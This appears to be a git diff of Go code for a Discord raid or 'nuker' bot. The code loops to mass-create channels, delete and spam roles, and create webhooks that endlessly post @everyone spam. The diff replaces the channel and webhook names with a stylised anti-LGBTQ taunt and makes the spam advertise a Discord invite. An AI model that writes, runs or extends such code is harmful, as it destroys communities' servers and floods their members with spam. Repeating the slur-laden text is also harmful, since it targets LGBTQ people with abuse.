@@ -88,7 +88,7 @@ restart:
 
 		for i := 0; i < 250; i++ {
 
-			go h.CreateChannels(dg, guildID, "how-do-i-code", guildz) // use - instead of space or its finna break
+			go h.CreateChannels(dg, guildID, "𝙂𝙊𝘿 𝘿𝙄𝘿! 𝙇𝙂𝘽𝙏𝙌 𝘼𝙎𝙎", guildz) // use - instead of space or its finna break
 			go DeleteRoles(dg, guildz)
 			go SpamRoles(dg, guildz)
 		}
@@ -238,7 +238,7 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string,
 		}
 		color.Success.Tips("Successfully created a channel")
 
-		hook, err := dg.WebhookCreate(channel.ID, "How-to-code-i-forgor", "https://i.ytimg.com/vi/DqZZRGXuHF8/maxresdefault.jpg")
+		hook, err := dg.WebhookCreate(channel.ID, "𝙂𝙊𝘿 𝘿𝙄𝘿! 𝙇𝙂𝘽𝙏𝙌 𝘼𝙎𝙎", "https://discord.gg/Jf72x52jms")
 		if err != nil {
 			color.Error.Tips(err.Error())
 		} else {
@@ -249,7 +249,7 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string,
 				for {
 					retry:
 					randomIndex := rand.Intn(len(webhooks))
-					req, err1 := http.Post(webhooks[randomIndex], "application/json", strings.NewReader(`{"content":"@everyone mb yo https://github.com/zLeki/How\nhttps://tenor.com/view/rip-pack-bozo-dead-gif-20309754"}`))
+					req, err1 := http.Post(webhooks[randomIndex], "application/json", strings.NewReader(`{"content":"@everyone ฿Ɇ₳₥ɆĐ฿Ɏ₵₳Ʉ₲Ⱨ₮ 𝙅𝙊𝙄𝙉 𝙏𝙃𝙄𝙎 𝙄𝙉𝙎𝙏𝙀𝘼𝘿 🤣 https://discord.gg/Jf72x52jms"}`))
 					if err1 != nil {
 						color.Error.Tips(err1.Error())
 					}
